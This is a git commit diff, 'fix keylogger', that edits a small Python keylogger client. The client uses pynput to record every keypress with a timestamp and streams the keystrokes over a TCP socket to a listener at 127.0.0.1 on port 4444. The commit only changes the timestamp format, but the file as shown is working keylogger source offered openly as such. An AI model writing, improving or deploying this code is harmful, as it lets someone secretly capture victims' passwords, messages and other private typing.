84393cf9e769cbaa35a7265fcaf7f59335893c7e
parham <parhamzardoshti@gmail.com>
2020-08-30 16:41:41 +0430

    fix keylogger

--- keylogger/clinet.py
+++ keylogger/clinet.py
@@ -1,16 +1,15 @@
 from pynput.keyboard import Key, Listener
 import os
-import time
 import socket
+from datetime import datetime
 
 mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 mysock.connect(('127.0.0.1', 4444))
 
 
 def on_press(key):
-       r = '{}\t\t{}\n'.format(key, time.time())
+       r = '{}\t\t{}\n'.format(key, str(datetime.now()))
        data = r.encode()
-       mysock.send(data)  
-    
+       mysock.send(data)
 with Listener(on_press=on_press) as listener:
-    listener.join()    
+    listener.join()
